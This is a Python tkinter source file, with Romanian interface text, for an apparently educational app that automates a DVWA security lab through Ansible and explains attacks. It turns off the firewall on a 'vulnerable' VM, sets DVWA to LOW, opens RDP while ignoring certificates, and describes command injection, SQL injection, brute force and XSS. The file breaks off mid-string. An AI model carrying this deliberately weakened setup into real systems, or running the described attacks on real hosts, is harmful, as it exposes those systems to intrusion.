# Import the libraries needed for the interface, external commands, threads, and HTTP requests.
import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk
import subprocess
import threading
import time
import requests
import re
import os

from variables import vulnerable_vm_ip, protected_vm_ip, windows_username, windows_password

# Define all fonts used by the interface in one place.
font_button = ("DejaVu Sans Mono", 12, "bold")
font_ansible = ("Courier", 10)
font_ansible_output_bold = ("Courier", 10, "bold")
font_explanation = ("DejaVu Sans", 12, "bold")
font_status = ("Arial", 10)
font_ansible_output_title = ("Arial", 18, "bold")
font_vm_title = ("DejaVu Sans Mono", 13, "bold")
font_output_title = ("DejaVu Sans Mono", 11, "bold")
font_attack_title = ("DejaVu Sans Mono", 14, "bold")
font_tab = ("DejaVu Sans Mono", 13, "bold")

# Mark a step as currently running.
def mark_in_progress(dot, status_text):
    dot.configure(
        fg = "blue"
        )
    status_text.configure(
        text = "În curs", 
        fg = "blue"
        )

# Mark a step as completed successfully.
def mark_done(dot, status_text):
    dot.configure(
        fg = "green"
        )
    status_text.configure(
        text = "Finalizat", 
        fg = "green"
        )

# Mark a step as failed.
def mark_error(dot, status_text):
    dot.configure(
        fg = "red"
        )
    status_text.configure(
        text = "Eroare", 
        fg = "red"
        )

# Functions that build the main elements of the configuration screen.
def create_config_panel():
    panel = tk.Frame(
        app,
        bg = "white",
        bd = 1,
        relief = "solid"
    )
    panel.place(
        relx = 0.20,
        rely = 0.50,
        anchor = "center",
        relwidth = 0.30,
        relheight = 0.84
    )
    return panel

# Create a menu button and, when needed, the status dot next to it.
def create_menu_button(panel, button_name, rely, status_exists):
    menu_button = tk.Button(
        panel,
        text = button_name,
        width = 30,
        height = 1,
        font = font_button,
        cursor="hand2"
    )
    menu_button.place(
        relx = 0.5,
        rely = rely, 
        anchor = "center"
    )

    status_dot = None
    if status_exists:
        status_dot = tk.Label(
            panel,
            text = "●",
            font = font_button,
            fg = "gray"
        )
        status_dot.place(
            relx = 0.73,
            rely = rely,
            anchor = "center"
        )

    return menu_button, status_dot

# Create one status row for steps executed by Ansible.
def create_config_step(panel, step_name, rely):
    label_step = tk.Label(
        panel,
        text = step_name,
        font = font_status,
        fg = "black",
        bg = "white"
    )
    label_step.place(
        relx = 0.2, 
        rely = rely, 
        anchor = "w"
        )

    status_dot = tk.Label(
        panel,
        text = "●",
        font = font_status,
        fg = "gray",
        bg = "white"
    )
    status_dot.place(
        relx = 0.18, 
        rely = rely, 
        anchor = "center"
    )

    status_text = tk.Label(
        panel,
        text = "În așteptare",
        font = font_status,
        fg = "gray",
        bg = "white"
    )
    status_text.place(
        relx = 0.8, 
        rely = rely, 
        anchor = "e"
    )

    return status_dot, status_text

# Run the Ansible playbook and update the interface after each detected step.
def run_playbook():

# Save the start time to calculate how long the configuration takes
    start_time = time.time()
    current_step = None

    try: 
        # Start the Ansible process from the global application folder.
        process = subprocess.Popen(
            ["ansible-playbook", "-i", "inventory.ini", "windows_configurations.yml"],
            cwd = "/usr/share/adsta/windows_configurations",
            stdout = subprocess.PIPE,
            stderr = subprocess.STDOUT,
            text = True,
            bufsize = 1
        )

        # Read the Ansible output line by line to update the interface in real time.
        for output in process.stdout:
            output_ansible.insert("end", output)
            output_ansible.see("end")

            # Step 1: check the WinRM connection.
            if "TASK [Verificare conexiune WinRM]" in output:
                output_ansible.insert(
                    "end",
                    "\nPrimul pas constă în verificarea conexiunii cu mașinile virtuale Windows de pe Kali. "
                    "Această verificare este necesară deoarece Ansible trebuie să trimită comenzi către Windows. "
                    "Comunicarea se realizează prin WinRM, un protocol oficial Microsoft. "
                    "WinRM rulează pe portul 5985 (HTTP) și permite executarea de la distanță a comenzilor PowerShell.\n"

                    "[ATENȚIE!] Dacă WinRM nu funcționează, niciun pas ulterior nu poate fi executat.\n",

                    "black_text"
                )
                mark_in_progress(status_winrm, text_winrm)
                current_step = (status_winrm, text_winrm)

            # Step 2: after WinRM is ready, check and configure the firewall.
            elif "TASK [Verificare dacă Windows Firewall este deja configurat]" in output:
                mark_done(status_winrm, text_winrm)
                mark_in_progress(status_firewall, text_firewall)
                current_step = (status_firewall, text_firewall)
                output_ansible.insert(
                    "end",
                    "\nDupă verificarea conexiunii WinRM, se verifică mai întâi dacă Windows Firewall a fost deja configurat anterior. "
                    "Această verificare este necesară pentru cazul în care playbook-ul nu este rulat pentru prima dată. "
                    "Dacă firewall-ul este deja configurat, se trece direct la următoarea etapă.\n"

                    "Dacă firewall-ul nu a fost deja configurat, acesta se configurează în funcție de tipul mașinii. "
                    "Pe mașina vulnerabilă firewall-ul se dezactivează complet. "
                    "Pe cea protejată firewall-ul rămâne activ și se adaugă doar o regulă pentru portul 80, pentru accesul la DVWA din browser.\n"

                    "Scopul acestei lucrări este evidențierea diferenței dintre o mașină virtuală Windows neprotejată și una protejată. "
                    "Firewall-ul fiind prima linie de apărare, diferențele dintre cele două încep să fie vizibile.\n",

                    "black_text"
                )

            # Step 3: after the firewall is ready, check the Chocolatey installation.
            elif "TASK [Verificare dacă Chocolatey este deja instalat]" in output:
                mark_done(status_firewall, text_firewall)
                mark_in_progress(status_chocolatey, text_chocolatey)
                current_step = (status_chocolatey, text_chocolatey)
                output_ansible.insert(
                    "end",
                    "\nÎn această etapă se verifică dacă Chocolatey este deja instalat pe mașina Windows. "
                    "Această verificare este necesară deoarece playbook-ul Ansible poate fi executat de mai multe ori, iar reinstalarea unei componente deja existente nu este necesară.\n"

                    "Chocolatey este un manager de pachete pentru Windows, utilizat pentru instalarea automată a aplicațiilor și componentelor necesare mediului de test. "
                    "În cadrul acestei configurări, Chocolatey este folosit pentru instalarea XAMPP, fără descărcarea și instalarea manuală a acestuia.\n"

                    "Dacă Chocolatey este găsit pe sistem, se trece direct la următoarea etapă. "
                    "În caz contrar, se va executa instalarea automată a managerului de pachete.\n",

                    "black_text"
                )

            # Step 4: after Chocolatey is ready, check the XAMPP installation.
            elif "TASK [Verificare dacă XAMPP există]" in output:
                mark_done(status_chocolatey, text_chocolatey)
                mark_in_progress(status_xampp_installed, text_xampp_installed)
                current_step = (status_xampp_installed, text_xampp_installed)
                output_ansible.insert(
                    "end",
                    "\nÎn această etapă se verifică dacă XAMPP este deja instalat pe mașina Windows. "
                    "XAMPP este un pachet software care conține componentele necesare pentru rularea aplicației DVWA: "
                    "Apache, MySQL și PHP. Apache are rolul de server web și răspunde la cererile HTTP, MySQL este sistemul de gestiune a bazei de date în care sunt stocați utilizatorii DVWA, iar PHP este limbajul în care este dezvoltată aplicația DVWA.\n"

                    "Față de instalarea separată a fiecărei componente, XAMPP oferă avantajul configurării unui mediu web complet într-un singur pas. "
                    "Dacă XAMPP este deja prezent pe sistem, se trece direct la următoarea etapă. În caz contrar, instalarea se execută automat prin Chocolatey.\n"

                    "[ATENȚIE!] Această etapă poate avea o durată mai mare decât celelalte, deoarece presupune descărcarea și instalarea unui pachet software complet.\n",

                    "black_text"
                )

            # Step 5: after XAMPP is installed, configure the Apache and MySQL services.
            elif "TASK [Verificare dacă Apache este deja serviciu Windows]" in output:
                mark_done(status_xampp_installed, text_xampp_installed)
                mark_in_progress(status_xampp_configured, text_xampp_configured)
                current_step = (status_xampp_configured, text_xampp_configured)
                output_ansible.insert(
                    "end",
                    "\nÎn această etapă se verifică dacă Apache și MySQL sunt deja înregistrate ca servicii Windows. "
                    "Această verificare este necesară deoarece playbook-ul poate fi executat de mai multe ori, iar reînregistrarea unor servicii existente nu este necesară.\n"

                    "Deși XAMPP instalează Apache și MySQL, aceste componente nu pornesc automat în mod implicit. "
                    "Pentru ca mediul DVWA să fie disponibil după pornirea mașinii virtuale, Apache și MySQL trebuie înregistrate ca servicii Windows.\n"

                    "Dacă serviciile există deja, se trece la etapa următoare. În caz contrar, Apache și MySQL sunt înregistrate ca servicii Windows și configurate cu start_mode auto, astfel încât să pornească automat la fiecare repornire a mașinii virtuale.\n",

                    "black_text"
                )

            # Step 6: after XAMPP is configured, download and copy DVWA.
            elif "TASK [Verificare dacă folderul temporar pentru DVWA există]" in output:
                mark_done(status_xampp_configured, text_xampp_configured)
                mark_in_progress(status_dvwa_installed, text_dvwa_installed)
                current_step = (status_dvwa_installed, text_dvwa_installed)
                output_ansible.insert(
                    "end",
                    "\nÎn această etapă se verifică mai întâi dacă folderul temporar necesar pentru DVWA există deja pe mașina Windows. "
                    "Această verificare este importantă deoarece playbook-ul poate fi executat de mai multe ori, iar descărcarea și copierea aplicației nu trebuie repetate dacă fișierele există deja.\n"

                    "DVWA, prescurtare de la Damn Vulnerable Web Application, este o aplicație web intenționat vulnerabilă, dezvoltată pentru învățarea și testarea conceptelor de securitate web într-un mediu controlat. "
                    "Aplicația este descărcată din repository-ul oficial al proiectului, disponibil pe github.com/digininja/DVWA. După descărcare, arhiva este dezarhivată într-un folder temporar și apoi copiată în directorul Apache, C:\\xampp\\htdocs\\DVWA, pentru a putea fi accesată ulterior din browser.\n"

                    "Dacă DVWA a fost deja descărcată, dezarhivată și copiată la o rulare anterioară, Ansible detectează acest lucru și trece peste task-urile care nu mai sunt necesare.\n",

                    "black_text"
                )

            # Step 7: after DVWA is installed, configure the security levels.
            elif "TASK [Verificare dacă config.inc.php există]" in output:
                mark_done(status_dvwa_installed, text_dvwa_installed)
                mark_in_progress(status_dvwa_configured, text_dvwa_configured)
                current_step = (status_dvwa_configured, text_dvwa_configured)
                output_ansible.insert(
                    "end",
                    "\nÎn această etapă se verifică mai întâi dacă fișierul principal de configurare al aplicației DVWA, config.inc.php, există deja. "
                    "Dacă fișierul nu este prezent, acesta este creat pe baza fișierului exemplu config.inc.php.dist, furnizat de aplicația DVWA.\n"

                    "DVWA permite configurarea mai multor niveluri de securitate: low, medium, high și impossible. "
                    "În cadrul acestui proiect sunt utilizate primul și ultimul nivel, pentru a evidenția diferența dintre un sistem vulnerabil și unul configurat cu măsuri stricte de protecție. "
                    "Pe mașina Windows vulnerabilă, nivelul de securitate este setat la LOW. "
                    "La acest nivel, codul aplicației conține numeroase vulnerabilități intenționate, utile pentru demonstrarea atacurilor. "
                    "Pe mașina Windows protejată, nivelul de securitate este setat la IMPOSSIBLE. "
                    "La acest nivel, aplicația folosește mecanisme de protecție.\n"

                    "Prin această configurare se creează două medii de test diferite.\n",

                    "black_text"
                )

            # Step 8: after DVWA is configured, create the database and the user.
            elif "TASK [Verificare dacă baza de date dvwa și userul dvwa există]" in output:
                mark_done(status_dvwa_configured, text_dvwa_configured)
                mark_in_progress(status_database, text_database)
                current_step = (status_database, text_database)
                output_ansible.insert(
                    "end",
                    "\nÎn această etapă se verifică mai întâi dacă baza de date dvwa și utilizatorul MySQL dvwa există deja. "
                    "Această verificare este necesară deoarece playbook-ul poate fi rulat de mai multe ori, iar recrearea bazei de date sau a utilizatorului nu este necesară dacă acestea au fost deja configurate anterior.\n"

                    "Dacă baza de date și utilizatorul există deja, se trece direct la etapa următoare. "
                    "În caz contrar, se creează baza de date dvwa, în care vor fi stocate informațiile utilizate de aplicația DVWA, inclusiv utilizatorii și parolele acestora.\n"

                    "Ulterior, se creează utilizatorul MySQL dvwa, căruia i se acordă drepturi doar asupra bazei de date dvwa.\n",

                    "black_text"

                )

            # Step 9: after the database is ready, create the DVWA tables.
            elif "TASK [Verificare dacă tabelele DVWA există deja]" in output:
                mark_done(status_database, text_database)
                mark_in_progress(status_dvwa_tables, text_dvwa_tables)
                current_step = (status_dvwa_tables, text_dvwa_tables)
                output_ansible.insert(
                    "end",
                    "\nÎn această etapă se verifică mai întâi dacă tabelele necesare aplicației DVWA există deja în baza de date. "
                    "Această verificare este necesară deoarece playbook-ul poate fi rulat de mai multe ori, iar reinițializarea tabelelor nu este necesară dacă acestea au fost deja create anterior.\n"

                    "Baza de date creată în etapa precedentă este inițial goală, iar pentru funcționarea aplicației DVWA trebuie adăugate tabelele specifice, inclusiv cele pentru utilizatori și parole. "
                    "În mod normal, această inițializare se realizează manual din pagina /setup.php, prin apăsarea butonului 'Create / Reset Database'.\n"

                    "Pentru automatizarea procesului, playbook-ul folosește funcția Invoke-WebRequest din PowerShell. "
                    "Aceasta trimite o cerere POST către pagina /setup.php, împreună cu parametrii necesari, simulând astfel acțiunea realizată manual din browser.\n"

                    "Dacă tabelele există deja, Ansible trece direct la etapa următoare. "
                    "În caz contrar, tabelele DVWA sunt inițializate automat prin /setup.php.\n",
                    
                    "black_text"
                )            

        # Wait for the playbook to finish and calculate the total duration.
        process.wait()
        duration = int(time.time() - start_time)
        minutes = duration // 60
        seconds = duration % 60

        # Exit code 0 means that Ansible finished without errors.
        if process.returncode == 0:
            mark_done(status_dvwa_tables, text_dvwa_tables)

            button_config.configure(
                state = "normal", 
                text = "Configurare finalizată!"
                )

            status_config.configure(
                fg = "green"
                )

            button_start.configure(
                state = "normal", 
                command = attack_interface)

            status_start.configure(
                fg = "green"
                )

            output_ansible.insert(
                "end", 
                "\nConfigurarea s-a finalizat cu succes!\n"

                "Apasă pe butonul „Pornește testele” pentru a accesa interfața de testare a vulnerabilităților.\n",

                "black_text"
                )

        # Any other exit code is treated as an error.
        else:
            # If an Ansible step has already been detected, its status is marked as failed.
            if current_step:
                mark_error(current_step[0], current_step[1])
            # If no Ansible step has been detected, a general startup error message is displayed.
            else:
                output_ansible.insert(
                    "end",
                    "\n[EROARE] Playbook-ul nu a pornit corect sau nu a fost detectată nicio etapă de configurare.\n"

                    "Verifică dacă Ansible este instalat corect și dacă fișierele playbook-ului sunt prezente în folderul /usr/share/adsta/windows_configurations.\n",
                    
                    "black_text"
                )

            # The configuration button is re-enabled after the error is handled.
            button_config.configure(
                state = "normal", 
                text = "Eroare: reîncearcă"
                )
            
            # The main configuration status is displayed as failed.
            status_config.configure(
                fg = "red"
                )
            
            output_ansible.insert(
                "end",
                "\nEroare la configurare. Verifică mesajele de mai sus sau conexiunea la rețea.\n",

                "black_text"
            )

        output_ansible.insert(
            "end", 
            f"\nDurată configurare: {minutes} minute și {seconds} secunde.\n",

            "black_text"
            )
        
    # Unexpected errors are handled here without closing the interface.
    except Exception as e:

        if current_step:
            mark_error(current_step[0], current_step[1])

        button_config.configure(
            state = "normal", 
            text = "Eroare: reîncearcă"
            )

        status_config.configure(
            fg = "red"
            )

        output_ansible.insert(
            "end", 
            f"\nEroare la configurare: {str(e)}\n"
            )

# Reset all configuration steps to their initial state.
def reset_config_steps():

    for dot, text in [
        (status_winrm, text_winrm),
        (status_firewall, text_firewall),
        (status_chocolatey, text_chocolatey),
        (status_xampp_installed, text_xampp_installed),
        (status_xampp_configured, text_xampp_configured),
        (status_dvwa_installed, text_dvwa_installed),
        (status_dvwa_configured, text_dvwa_configured),
        (status_database, text_database),
        (status_dvwa_tables, text_dvwa_tables),
    ]:
        dot.configure(
            fg = "gray"
            )

        text.configure(
            text = "În așteptare", 
            fg="gray"
        )

# Start the configuration when the user presses the “Configurare Windows” button.
def config_button_on():

    output_ansible.delete("1.0", "end")
    reset_config_steps()

    button_config.configure(
        state = "disabled", 
        text = "Se configurează..."
        )

    status_config.configure(
        fg="blue"
        )

    button_start.configure(
        state="disabled"
        )

    status_start.configure(
        fg="gray"
        )
    
    # Run the playbook in a separate thread so the interface does not freeze.
    thread = threading.Thread(
        target = run_playbook, 
        daemon = True
        )
    thread.start()

# Show a window with general information about the application.
def show_info():
    messagebox.showinfo(
        "Despre aplicație",
        "Automated DVWA Security Testing App\n\n"

        "Această aplicație are rolul de a automatiza configurarea și testarea unui mediu de securitate construit pentru analizarea vulnerabilităților aplicațiilor web. "
        "Mediul de testare este alcătuit dintr-o mașină Kali Linux, folosită pentru lansarea testelor, și două mașini virtuale Windows care găzduiesc aceeași aplicație web intenționat vulnerabilă, DVWA.\n\n"

        "Cele două mașini Windows sunt configurate diferit pentru a evidenția impactul măsurilor de protecție:\n"
        "1. Windows vulnerabil (10.0.2.10) — firewall dezactivat și DVWA Security setat pe LOW\n"
        "2. Windows protejat (10.0.3.10) — firewall activ și DVWA Security setat pe IMPOSSIBLE\n\n"

        "Aplicația permite rularea comparativă a testelor de rețea, precum Ping, Nmap și Netcat, dar și a atacurilor asupra DVWA: Brute Force, Command Injection, SQL Injection și XSS Reflected.\n"
	    "Scopul aplicației este de a demonstra, într-un mediu izolat și controlat, diferența dintre un sistem expus și unul protejat, prin compararea rezultatelor obținute în aceleași condiții de testare."
    )

# The main screen is created, including the Windows configuration controls.
def main_interface():

# Existing widgets are removed before the screen is rebuilt.
    for widget in app.winfo_children():
        widget.destroy()

    app.title("Automated DVWA Security Testing App")

# These widgets are declared as global because they are updated by other functions.
    global button_config, button_start, button_info, button_exit
    global status_config, status_start
    global output_ansible
    global status_winrm, text_winrm
    global status_firewall, text_firewall
    global status_chocolatey, text_chocolatey
    global status_xampp_installed, text_xampp_installed
    global status_xampp_configured, text_xampp_configured
    global status_dvwa_installed, text_dvwa_installed
    global status_dvwa_configured, text_dvwa_configured
    global status_database, text_database
    global status_dvwa_tables, text_dvwa_tables

    #The left configuration panel is created.
    config_panel = create_config_panel()

    button_config, status_config = create_menu_button(
        config_panel,
        "Configurare Windows",
        0.06,
        True
    )

    # Start the configuration process.
    button_config.configure(
        command = config_button_on
        )

    status_title = tk.Label(
        config_panel,
        text = "Status configurare",
        fg = "black",
        bg = "white"
    )
    status_title.place(
        relx=0.50,
        rely=0.14,
        anchor="center"
        )

    status_winrm, text_winrm = create_config_step(
        config_panel,
        "Conexiune WinRM",
        0.21
    )

    status_firewall, text_firewall = create_config_step(
        config_panel,
        "Firewall configurat",
        0.26
    )

    status_chocolatey, text_chocolatey = create_config_step(
        config_panel,
        "Chocolatey instalat",
        0.31
    )

    status_xampp_installed, text_xampp_installed = create_config_step(
        config_panel,
        "XAMPP instalat",
        0.36
    )

    status_xampp_configured, text_xampp_configured = create_config_step(
        config_panel,
        "XAMPP configurat",
        0.41
    )

    status_dvwa_installed, text_dvwa_installed = create_config_step(
        config_panel,
        "DVWA instalat",
        0.46
    )

    status_dvwa_configured, text_dvwa_configured = create_config_step(
        config_panel,
        "DVWA configurat",
        0.51
    )

    status_database, text_database = create_config_step(
        config_panel,
        "Baza date DVWA",
        0.56
    )

    status_dvwa_tables, text_dvwa_tables = create_config_step(
        config_panel,
        "Tabele DVWA create",
        0.61
    )

    button_start, status_start = create_menu_button(
        config_panel,
        "Pornește testele",
        0.70,
        True
    )

    button_start.configure(
        state = "disabled"
        )

    button_info, _ = create_menu_button(
        config_panel,
        "Informații",
        0.82,
        False
    )

    button_info.configure(
        command = show_info
        )

    button_exit, _ = create_menu_button(
        config_panel,
        "Ieșire",
        0.94,
        False
    )

    button_exit.configure(
        command = app.destroy
        )

    label_ansible_output = tk.Label(
        app,
        text = "Rezultate configurare Ansible",
        font = font_ansible_output_title
    )
    label_ansible_output.place(
        relx = 0.46,
        rely = 0.12,
        anchor = "center"
        )

    # The Ansible output area is created.
    output_ansible = scrolledtext.ScrolledText(
        app,
        font = font_ansible,
        wrap = "word"
    )
    output_ansible.place(
        relx = 0.66,
        rely = 0.53,
        relwidth = 0.58,
        relheight = 0.78,
        anchor = "center"
    )

    # A bold style is defined for the step explanations.
    output_ansible.tag_configure(
        "black_text",
        foreground = "black",
        font = font_ansible_output_bold
        )

    output_ansible.insert(
        "end",
        "\nBine ai venit în aplicația Automated DVWA Security Testing!\n\n"

        "Pentru utilizarea corectă a aplicației, este necesară rularea procesului de configurare a mașinilor virtuale Windows.\n\n"

        "Apasă pe butonul „Configurare Windows” pentru a porni playbook-ul Ansible.\n\n"

        "În partea stângă sunt afișate etapele executate de playbook și starea fiecărei etape, iar în partea dreaptă sunt afișate rezultatele configurării împreună cu explicațiile aferente.",

        "black_text"
    )    

# Functions that build the main elements of the testing and attack screen.

# Create a large menu button for the attack screen.
def create_menu2_button(parent, button_name, rely, command):

    button = tk.Button(
        parent,
        text = button_name,
        command = command,
        width = 30,
        height = 1,
        font = font_button,
        cursor = "hand2"
    )
    button.place(
        relx = 0.5,
        rely = rely,
        anchor = "center"
    )

    return button

# Create one row with an info button, a run button, and a status dot.
def create_row(tab, attack_test_name, rely):

    info_button = tk.Button(
        tab,
        text = "i",
        width = 2,
        height = 1,
        font = font_button,
        cursor = "hand2"
    )
    info_button.place(
        relx = 0.10,
        rely = rely,
        anchor = "center"
    )

    attack_test_button = tk.Button(
        tab,
        text = attack_test_name,
        width = 20,
        height = 1,
        font = font_button,
        cursor = "hand2"
    )
    attack_test_button.place(
        relx = 0.55,
        rely = rely,
        anchor = "center"
    )

    status_dot = tk.Label(
        tab,
        text = "●",
        font = font_button,
        fg = "gray"
    )
    status_dot.place(
        relx = 0.95,
        rely = rely,
        anchor = "center"
    )

    return info_button, attack_test_button, status_dot

# Disable the buttons while a test is running, to avoid starting several tests at the same time.
def disable_buttons():

    for button in [
        button_ping, 
        button_nmap, 
        button_netcat,
        button_try, 
        button_brute_force, 
        button_command_injection, 
        button_sql_injection, 
        button_xss_reflected, 
        button_reset, 
        button_back
        ]:
        button.configure(
            state = "disabled"
            )

# Enable the buttons again after a test has finished.
def enable_buttons():

    for button in [
        button_ping, 
        button_nmap, 
        button_netcat, 
        button_try, 
        button_brute_force, 
        button_command_injection, 
        button_sql_injection, 
        button_xss_reflected, 
        button_reset, 
        button_back
        ]:
        button.configure(
            state = "normal"
            )

# Check if at least one Windows virtual machine is selected.
def check_vm_selection():
    if not var_vm_vulnerable.get() and not var_vm_protected.get():
        messagebox.showwarning(
            "Atenție!",
            "Selectează cel puțin una dintre mașinile Windows!"
        )
        return False

    return True

# Clear the output area for the selected Windows virtual machines.
def reset_output():

    if not check_vm_selection():
        return

    if var_vm_vulnerable.get():
        output_vulnerable.delete("1.0", "end")

    if var_vm_protected.get():
        output_protected.delete("1.0", "end")


# Return to the main menu.
def back_to_main_menu():
    main_interface()

# Open the RDP connection to a selected Windows machine.
def open_windows(ip, output_box):
    
    output_box.insert(
        "end",
        f"\nSe deschide {ip} prin RDP...\n"
        "DVWA se va deschide automat în browser în câteva momente.\n"
        "Autentificare DVWA: admin / password\n\n"
    )

    output_box.see(
        "end"
        )

    try:
        # xfreerdp starts an RDP session to Windows.
        subprocess.Popen([
            "xfreerdp",
            "/v:" + ip,
            "/u:" + windows_username,
            "/p:" + windows_password,
            "/cert:ignore"
        ])

    except Exception as e:

        output_box.insert(
            "end", 
            f"[EROARE] Nu s-a putut deschide RDP: {str(e)}\n\n"
            )

        output_box.see(
            "end"
            )

# Check which Windows virtual machine the user selected and open the RDP connection for it.
def open_windows_callback():

    if not check_vm_selection():
        return

    if var_vm_vulnerable.get():
        open_windows(vulnerable_vm_ip, output_vulnerable)

    if var_vm_protected.get():
        open_windows(protected_vm_ip, output_protected)

# Store the descriptions and result interpretations for the PING, NMAP, and NETCAT system tests.
SYSTEM_TEST_TEXTS = {
    "PING": {
        "about": (
            "Acest test are rolul de a verifica accesibilitatea mașinii Windows selectate în rețea, prin transmiterea unor mesaje ICMP de tip Echo Request către adresa IP țintă. "
            "Dacă sistemul este activ, accesibil și configurat să răspundă la astfel de cereri, acesta returnează mesaje Echo Reply, confirmând existența conectivității de bază între mașina Kali Linux și sistemul Windows testat. "
            "Totuși, absența unui răspuns la ping nu indică în mod obligatoriu faptul că mașina este oprită sau inaccesibilă, deoarece traficul ICMP poate fi blocat prin reguli de firewall."
        ),
        "vulnerable": {
            "interpretation": (
                "Mașina Windows vulnerabilă a răspuns la pachetele ICMP trimise, fără pierderi de pachete. "
                "Acest rezultat confirmă faptul că sistemul este accesibil din rețea. "            
                )
        },
        "protected": {
            "interpretation": (
                "Mașina Windows protejată nu a răspuns la pachetele ICMP, rezultatul indicând pierdere completă de pachete. "
                "Acest lucru nu înseamnă neapărat că sistemul este oprit. "
                "Testele Nmap și Netcat pot confirma că mașina este activă, iar lipsa răspunsului la ping indică blocarea traficului ICMP de către firewall."
            )
        }
    },

    "NMAP": {
        "about": (
            "Acest test are rolul de a analiza nivelul de expunere al mașinii Windows selectate, prin scanarea porturilor și identificarea serviciilor disponibile. "
            "NMAP trimite pachete către mașina țintă și interpretează răspunsurile primite pentru a determina dacă porturile sunt deschise, închise sau filtrate. "
            "Rezultatul permite observarea serviciilor accesibile din rețea."
        ),
        "vulnerable": {
            "interpretation": (
                "Scanarea NMAP a identificat mai multe porturi deschise pe mașina vulnerabilă, precum HTTP, HTTPS, MySQL, RDP, WinRM și servicii specifice Windows. "
                "Prezența unui număr mare de porturi deschise indică o suprafață de atac extinsă. "
                "Un atacator poate folosi aceste informații pentru a identifica serviciile disponibile și posibile puncte de intrare în sistem."
            )
        },
        "protected": {
            "interpretation": (
                "Scanarea NMAP arată că mașina protejată este activă, însă majoritatea porturilor sunt filtrate. "
                "Au rămas accesibile doar câteva servicii necesare, precum HTTP, RDP și WinRM. "
                "Comparativ cu mașina vulnerabilă, suprafața de atac este mult redusă, deoarece firewall-ul blochează majoritatea conexiunilor."
            )
        }
    },

    "NETCAT": {
        "about": (
            "Acest test are rolul de a verifica individual conectivitatea către un set de porturi ale mașinii Windows selectate. "
            "Netcat încearcă să stabilească o conexiune către fiecare port specificat și afișează rezultatul obținut pentru fiecare caz. "
            "Prin utilizarea opțiunii -z, testul verifică existența serviciilor care ascultă pe porturile indicate, fără transmiterea de date către acestea, iar opțiunea -v permite afișarea detaliată a rezultatului conexiunii. "
            "Rezultatul testului permite observarea porturilor accesibile din rețea."
      ),
        "vulnerable": {
            "interpretation": (
                "Testul Netcat confirmă faptul că porturile verificate sunt accesibile pe mașina vulnerabilă. "
                "Mesajele de tip succeeded indică faptul că s-a putut stabili o conexiune TCP către serviciile respective. "
                "Acest rezultat confirmă nivelul ridicat de expunere al sistemului, cauzat de lipsa restricțiilor impuse de firewall."
            )
        },
        "protected": {
            "interpretation": (
                "Testul Netcat confirmă faptul că doar anumite porturi sunt accesibile pe mașina protejată. "
                "Porturile care afișează succeeded permit stabilirea unei conexiuni TCP, iar porturile care afișează connection timed out sunt blocate sau filtrate. "
                "Acest comportament arată că firewall-ul limitează accesul din exterior și permite doar serviciile necesare."
            )
        }
    }
}

ATTACK_TEST_INFO_TEXTS = {
    "PING": (
        "Acest test are rolul de a verifica accesibilitatea mașinii Windows selectate în rețea, prin transmiterea unor mesaje ICMP de tip Echo Request către adresa IP țintă. "
        "Dacă sistemul este activ, accesibil și configurat să răspundă la astfel de cereri, acesta returnează mesaje Echo Reply, confirmând existența conectivității de bază între mașina Kali Linux și sistemul Windows testat. "
        "Totuși, absența unui răspuns la ping nu indică în mod obligatoriu faptul că mașina este oprită sau inaccesibilă, deoarece traficul ICMP poate fi blocat prin reguli de firewall."
    ),

    "NMAP": (
        "Acest test are rolul de a analiza nivelul de expunere al mașinii Windows selectate, prin scanarea porturilor și identificarea serviciilor disponibile. "
        "NMAP trimite pachete către mașina țintă și interpretează răspunsurile primite pentru a determina dacă porturile sunt deschise, închise sau filtrate. "
        "Rezultatul permite observarea serviciilor accesibile din rețea."
    ),

    "NETCAT": (
        "Acest test are rolul de a verifica individual conectivitatea către un set de porturi ale mașinii Windows selectate. "
        "Netcat încearcă să stabilească o conexiune către fiecare port specificat și afișează rezultatul obținut pentru fiecare caz. "
        "Prin utilizarea opțiunii -z, testul verifică existența serviciilor care ascultă pe porturile indicate, fără transmiterea de date către acestea, iar opțiunea -v permite afișarea detaliată a rezultatului conexiunii. "
        "Rezultatul testului permite observarea porturilor accesibile din rețea."
    ),

    "Brute Force": (
        "Acest atac încearcă să descopere date de autentificare valide prin testarea automată și repetată a mai multor combinații de utilizator și parolă. "
        "Metoda se bazează pe folosirea unor credențiale slabe sau frecvent întâlnite. "
        "În scenariul vulnerabil, aplicația permite un număr nelimitat de încercări, fără mecanisme care să oprească atacurile automate, astfel încât combinația corectă poate fi găsită prin simpla parcurgere a listei. "
        "În scenariul protejat, atacul este mult mai greu de realizat, deoarece aplicația folosește mecanisme suplimentare, precum token-uri de securitate și validarea sesiunii. "
        "Atacul evidențiază modul în care măsurile de securitate împiedică compromiterea credențialelor, în timp ce o aplicație vulnerabilă rămâne expusă la acces neautorizat."
    ),

    "Command Injection": (
        "Acest atac exploatează modul în care aplicația transmite datele de intrare către sistemul de operare. "
        "Pagina execută o comandă ping asupra adresei IP introduse de utilizator. "
        "Dacă datele nu sunt validate, după caracterul '&' se poate adăuga o a doua comandă, care va fi executată și ea pe server. "
        "În scenariul vulnerabil, comanda suplimentară este executată, ceea ce permite rularea de comenzi arbitrare pe mașină. "
        "În scenariul protejat, datele de intrare sunt validate astfel încât să fie acceptată doar o adresă IP corectă, iar comanda suplimentară este respinsă. "
        "Atacul evidențiază modul în care lipsa validării datelor de intrare poate duce la compromiterea completă a serverului."
    ),

    "SQL Injection": (
        "Acest atac introduce cod SQL în câmpurile aplicației pentru a manipula interogările trimise către baza de date. "
        "În locul unei valori normale, de exemplu un număr de identificare, se trimite o interogare special construită care forțează aplicația să returneze mai multe date decât ar trebui. "
        "În scenariul vulnerabil, datele primite sunt introduse direct în interogarea către baza de date, fără validare, astfel încât pot fi extrase informații suplimentare. "
        "În scenariul protejat, aplicația folosește interogări parametrizate și validarea datelor, astfel încât tentativa de injecție este tratată ca text obișnuit și nu mai are efect. "
        "Atacul evidențiază modul în care lipsa validării datelor de intrare duce la expunerea bazei de date, în timp ce o aplicație securizată păstrează datele protejate."
    ),

    "XSS REFLECTED": (
        "Acest atac injectează cod JavaScript într-un câmp al paginii web. "
        "În cazul atacului XSS reflectat, codul introdus de utilizator nu este stocat în aplicație, ci este returnat imediat în răspunsul paginii. "
        "În scenariul vulnerabil, aplicația afișează direct valoarea introdusă, fără filtrare sau escaping, astfel încât browserul poate interpreta payload-ul ca HTML sau JavaScript executabil. "
        "În scenariul protejat, aplicația folosește funcția htmlspecialchars(), care transformă caracterele speciale în text inofensiv. "
